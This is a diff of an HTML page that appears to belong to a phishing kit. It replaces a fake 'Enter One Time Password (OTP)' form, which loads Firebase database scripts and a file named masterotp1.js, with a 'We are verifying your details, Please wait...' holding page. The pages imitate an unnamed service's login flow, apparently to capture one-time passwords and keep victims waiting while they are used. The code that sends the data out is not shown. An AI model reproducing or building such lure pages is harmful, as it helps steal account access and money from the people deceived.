@@ -1,124 +1,61 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Wellcome</title>
-<meta name="description" content="login">
-<meta name="next-head-count" content="4">
-    
-<link rel="preload" href="8cc68e2ef518f736.css" as="style">
+<!doctype html>
 
-    
-<link rel="stylesheet" href="8cc68e2ef518f736.css" data-n-g="">
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>wellcome</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+
+  </head>
+
+  <body>
+
+    <header>
+
+      <img src="logo.png" width="100%" alt="">
+
+  </header>
 
 
-    <link rel="icon" type="image/png" sizes="32x32" href="book.png">
- 
 
-    </head><body>
+    <main class="mt-4">
 
-    <div id="">
-    <div class="header">
-        
-    <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
-    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27125%27%20height=%2735%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
-        
-        
-    <img alt="Logo" src="book.png" decoding="async" data-nimg="intrinsic" class="img-logo" style="width: 0px; position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
-        
-        
-        
+        <div class="container">
+
+            <div class="mx-4 d-flex justify-content-center mb-5 text-center flex-column align-items-center mt-5">
+
+                <h3 for="" class="text-secondary">We are verifying your details, Please wait...</h3>
+
+                <img src="loader.gif" width="100%" alt="">
+
+            </div>
+
         </div>
-      
-        
-        
-    
-    <div class="mainContent">
-    <h1 class="text-center">Enter One Time Password (OTP)</h1>
-    <div class="card">
-    <p style="margin-top: 1px; margin-left: 8px;">One Time Password (OTP) has been sent to your mobile, please enter the same here.</p>
-        
-    
-        <form id="ududip007" class="LoginForm"  method="post" autocomplete="off">
-        
-    <div class="form-group">
-    <label for="Otp1">One Time Password</label>
-    <input type="text" id="otp" class="new-control" name="Otp1" inputmode="numeric" minlength="6" maxlength="8" required=""></div><div class="text-center">
-        
-         <input class="submit" type="submit" tabindex="18" title="Login" value="Submit" id="Button1" onclick="return submitLoginShagc('nLEbcx0S');">
-<button class="submit" onclick="location.reload();" id="Button2" style="opacity: 0.5;">Resend</button>
-<p>Resend OTP in <span id="countdown"></span> seconds</p>
-</div>
-</form>
-</div>
-</div>
-</div>
 
+    </main>
 
-<script>
-function formatOtp(input) {
-  // Remove any non-numeric characters from the input value
-  const numericValue = input.value.replace(/[^0-9]/g, '');
+    <footer>
 
-  // Insert a space after every digit except for the last one
-  const formattedValue = numericValue.replace(/(.)(?!$)/g, '$1 ');
+        <img src="footer.jpg" width="100%" alt="">
 
-  // Replace the dash with an underscore (_) after the 6th digit
-  const formattedOtp = formattedValue.replace(/(.{5})-(?!$)/g, '$1_');
+    </footer>
 
-  // Update the input value
-  input.value = formattedOtp;
-}
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
 
-function validateAndSubmit(input) {
-  // Remove spaces from the input value before validation
-  const otpValue = input.value.replace(/\s/g, '');
-
-  // Validate that the input is exactly 6 digits
-  if (otpValue.length !== 6) {
-    input.setCustomValidity('Please enter a 6-digit OTP');
-    return false;
-  } else {
-    input.setCustomValidity('');
-    return true;
-  }
-}
-
-var count = 120; // Countdown timer in seconds
-
-function updateCountdown() {
-  if (count > 0) {
-    count--;
-    document.getElementById("countdown").innerHTML = count;
-  } else {
-    clearInterval(timer);
-    document.getElementById("Button2").disabled = false;
-    document.getElementById("Button2").style.opacity = "1";
-    document.getElementById("countdown").innerHTML = "";
-  }
-}
-
-var timer = setInterval(updateCountdown, 1000);
-
-document.getElementById("Button2").disabled = true;
-</script>
-        
-    
-    
-    
-    <next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">Wellcome</p></next-route-announcer>
-    
-    
-    
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
-    
-    
-    <script src="firebase.js">  </script>
-<script src="masterotp1.js">  </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
 
     
 
-    </body></html>
+  </body>
+
+</html>
